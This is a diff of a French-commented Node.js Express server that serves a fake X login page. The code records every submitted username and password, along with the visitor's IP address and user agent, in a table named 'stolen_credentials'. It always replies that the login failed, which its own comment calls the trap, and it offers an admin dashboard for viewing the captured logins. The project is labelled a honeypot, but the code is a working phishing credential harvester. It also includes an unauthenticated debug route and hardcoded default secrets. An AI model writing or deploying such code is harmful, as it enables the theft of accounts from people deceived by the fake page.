@@ -1,67 +1,55 @@
 const express = require('express');
 const session = require('express-session');
 const path = require('path');
-const { createClient } = require('@libsql/client');
+const sqlite3 = require('sqlite3').verbose();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// --- CONFIGURATION BDD ---
-const db = createClient({
-    url: process.env.TURSO_DATABASE_URL || 'file:local.db',
-    authToken: process.env.TURSO_AUTH_TOKEN || undefined
-});
+// --- BASE DE DONNÉES ---
+const db = new sqlite3.Database('local.db');
 
-// --- INITIALISATION DE LA BDD ---
-async function initDb() {
-    try {
-        await db.execute(`
-            CREATE TABLE IF NOT EXISTS stolen_credentials (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                username TEXT NOT NULL,
-                password TEXT NOT NULL,
-                ip TEXT,
-                user_agent TEXT,
-                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-            )
-        `);
-        console.log('✅ Base de données initialisée');
-    } catch (error) {
-        console.error('❌ Erreur BDD:', error);
-    }
-}
-initDb().catch(console.error);
+// Créer la table
+db.run(`
+    CREATE TABLE IF NOT EXISTS stolen_credentials (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        username TEXT NOT NULL,
+        password TEXT NOT NULL,
+        ip TEXT,
+        user_agent TEXT,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )
+`);
 
 // --- MIDDLEWARE ---
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// --- SESSIONS (configuration adaptée pour Render) ---
+// --- SESSIONS ---
 app.use(session({
-    secret: process.env.SESSION_SECRET || 'x-honeypot-secret-key-change-me',
+    secret: process.env.SESSION_SECRET || 'honeypot-secret-123',
     resave: false,
     saveUninitialized: false,
-    cookie: { 
-        secure: process.env.NODE_ENV === 'production', // true sur Render
-        maxAge: 24 * 60 * 60 * 1000, // 24h
-        sameSite: 'lax'
+    cookie: {
+        secure: process.env.NODE_ENV === 'production',
+        maxAge: 24 * 60 * 60 * 1000
     }
 }));
 
-// --- ROUTES PUBLIQUES ---
+// --- ROUTES ---
 
-// 1. Page d'accueil (fausse page X)
+// Page d'accueil (fausse page X)
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// 2. Page admin (connexion)
+// Page de connexion admin
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'private', 'admin.html'));
 });
 
-// 3. Dashboard admin (protégé)
+// Dashboard admin (protégé)
 app.get('/admin/dashboard', (req, res) => {
     if (!req.session.user) {
         return res.redirect('/admin');
@@ -69,88 +57,75 @@ app.get('/admin/dashboard', (req, res) => {
     res.sendFile(path.join(__dirname, 'private', 'dashboard.html'));
 });
 
-// --- ROUTES DE DEBUG (pour tester sans auth) ---
+// Dashboard direct (sans auth - pour debug)
 app.get('/admin/dashboard-direct', (req, res) => {
     res.sendFile(path.join(__dirname, 'private', 'dashboard.html'));
 });
 
-app.get('/api/test-session', (req, res) => {
-    res.json({
-        sessionID: req.sessionID,
-        user: req.session.user || 'pas de session',
-        cookies: req.headers.cookie || 'pas de cookies',
-        env: process.env.NODE_ENV || 'non défini'
-    });
-});
-
 // --- API ROUTES ---
 
-// 4. Enregistrer les identifiants volés (route publique)
-app.post('/api/login', async (req, res) => {
+// Enregistrer les identifiants volés
+app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
-    
+
     if (!username || !password) {
         return res.status(400).json({ error: 'Champs requis' });
     }
 
-    try {
-        await db.execute({
-            sql: 'INSERT INTO stolen_credentials (username, password, ip, user_agent) VALUES (?, ?, ?, ?)',
-            args: [
-                username, 
-                password, 
-                req.ip || req.headers['x-forwarded-for'] || 'unknown',
-                req.headers['user-agent'] || 'unknown'
-            ]
-        });
+    const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
+    const userAgent = req.headers['user-agent'] || 'unknown';
 
-        console.log(`🔴 IDENTIFIANTS VOLÉS : ${username} / ${password}`);
+    db.run(
+        'INSERT INTO stolen_credentials (username, password, ip, user_agent) VALUES (?, ?, ?, ?)',
+        [username, password, ip, userAgent],
+        function(err) {
+            if (err) {
+                console.error('❌ Erreur insertion:', err.message);
+                return res.status(500).json({ error: 'Erreur serveur' });
+            }
 
-        res.status(401).json({ 
-            error: 'Identifiants incorrects. Veuillez réessayer.' 
-        });
+            console.log(`🔴 IDENTIFIANTS VOLÉS : ${username} / ${password}`);
 
-    } catch (error) {
-        console.error('Erreur BDD:', error);
-        res.status(500).json({ error: 'Erreur serveur' });
-    }
+            // Toujours répondre "échec" (c'est le piège)
+            res.status(401).json({
+                error: 'Identifiants incorrects. Veuillez réessayer.'
+            });
+        }
+    );
 });
 
-// 5. Récupérer les identifiants volés (route protégée)
-app.get('/api/credentials', async (req, res) => {
+// Récupérer les identifiants volés (protégé)
+app.get('/api/credentials', (req, res) => {
     if (!req.session.user) {
         return res.status(401).json({ error: 'Non autorisé' });
     }
 
-    try {
-        const result = await db.execute('SELECT * FROM stolen_credentials ORDER BY created_at DESC');
-        res.json(result.rows);
-    } catch (error) {
-        console.error('Erreur BDD:', error);
-        res.status(500).json({ error: 'Erreur serveur' });
-    }
+    db.all('SELECT * FROM stolen_credentials ORDER BY created_at DESC', (err, rows) => {
+        if (err) {
+            console.error('❌ Erreur récupération:', err.message);
+            return res.status(500).json({ error: 'Erreur serveur' });
+        }
+        res.json(rows);
+    });
 });
 
-// 6. Supprimer un identifiant (route protégée)
-app.delete('/api/credentials/:id', async (req, res) => {
+// Supprimer un identifiant (protégé)
+app.delete('/api/credentials/:id', (req, res) => {
     if (!req.session.user) {
         return res.status(401).json({ error: 'Non autorisé' });
     }
 
     const id = req.params.id;
-    try {
-        await db.execute({
-            sql: 'DELETE FROM stolen_credentials WHERE id = ?',
-            args: [id]
-        });
+    db.run('DELETE FROM stolen_credentials WHERE id = ?', [id], function(err) {
+        if (err) {
+            console.error('❌ Erreur suppression:', err.message);
+            return res.status(500).json({ error: 'Erreur serveur' });
+        }
         res.json({ success: true });
-    } catch (error) {
-        console.error('Erreur BDD:', error);
-        res.status(500).json({ error: 'Erreur serveur' });
-    }
+    });
 });
 
-// 7. Connexion admin (vérifie les identifiants)
+// Connexion admin
 app.post('/api/admin-login', (req, res) => {
     const { username, password } = req.body;
     const adminUser = process.env.ADMIN_USER || 'admin';
@@ -161,12 +136,12 @@ app.post('/api/admin-login', (req, res) => {
         console.log(`✅ Admin connecté : ${username}`);
         res.json({ success: true });
     } else {
-        console.log(`❌ Tentative échouée : ${username} / ${password}`);
+        console.log(`❌ Tentative échouée : ${username}`);
         res.status(401).json({ error: 'Identifiants incorrects' });
     }
 });
 
-// 8. Déconnexion admin
+// Déconnexion
 app.post('/api/logout', (req, res) => {
     req.session.destroy();
     res.json({ success: true });
@@ -176,7 +151,6 @@ app.post('/api/logout', (req, res) => {
 app.listen(PORT, () => {
     console.log(`🚀 Serveur lancé sur http://localhost:${PORT}`);
     console.log(`📡 Fausse page X : http://localhost:${PORT}/`);
-    console.log(`🔐 Panel admin : http://localhost:${PORT}/admin`);
-    console.log(`🔑 Identifiants admin par défaut : admin / changeme`);
-    console.log(`🛠️  DEBUG : /admin/dashboard-direct (sans auth)`);
+    console.log(`🔐 Admin : http://localhost:${PORT}/admin`);
+    console.log(`🛠️  Debug : http://localhost:${PORT}/admin/dashboard-direct`);
 });
